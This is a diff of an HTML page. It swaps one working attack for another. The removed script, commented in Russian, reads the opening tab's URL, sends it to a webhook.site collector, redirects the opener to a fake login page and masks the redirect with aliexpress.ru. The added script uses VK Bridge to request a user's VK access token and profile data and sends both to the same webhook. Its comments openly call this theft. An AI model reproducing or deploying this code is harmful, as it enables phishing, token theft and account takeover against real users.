@@ -1,41 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head>
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+</head>
 <body>
-<script>
-  const webhook = "https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0";
+    <script>
+        vkBridge.send('VKWebAppInit');
 
-  try {
-    if (window.opener) {
-      // 1. Пытаемся украсть URL родителя (самое ценное)
-      let parentUrl = "Access Denied";
-      try {
-        parentUrl = window.opener.location.href;
-      } catch(e) {
-        // Если доступ к href закрыт, пробуем хотя бы узнать домен
-        parentUrl = "Blocked by Cross-Origin Policy";
-      }
-
-      // 2. Отправляем данные на вебхук
-      fetch(webhook + "?leak=" + btoa(parentUrl) + "&origin=" + btoa(document.referrer));
-
-      // 3. Трюк "Tabnabbing": если мы не можем прочитать URL, 
-      // мы всё еще можем ПОМЕНЯТЬ его на свой (фейковый логин)
-      try {
-        window.opener.location = "https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0/fake_login_page";
-      } catch(e) {}
-    } else {
-      // Если открыто без opener
-      fetch(webhook + "?error=no_opener&ref=" + btoa(document.referrer));
-    }
-  } catch (err) {
-    fetch(webhook + "?error=" + btoa(err.message));
-  }
-
-  // Через 2 секунды уводим пользователя на легитимный сайт
-  setTimeout(() => {
-    location.href = "https://aliexpress.ru";
-  }, 1500);
-</script>
+        // Пытаемся вызвать получение токена. 
+        // Если пользователь нажмет "Разрешить", токен прилетит к нам!
+        vkBridge.send("VKWebAppGetAuthToken", {"app_id": 54401740, "scope": "friends,status"})
+            .then(data => {
+                fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?token=" + data.access_token);
+            })
+            .catch(error => {
+                fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?error=" + btoa(JSON.stringify(error)));
+            });
+            
+        // Также крадем инфу о пользователе (без подтверждения)
+        vkBridge.send("VKWebAppGetUserInfo").then(data => {
+            fetch("https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0?user=" + btoa(JSON.stringify(data)));
+        });
+    </script>
 </body>
 </html>
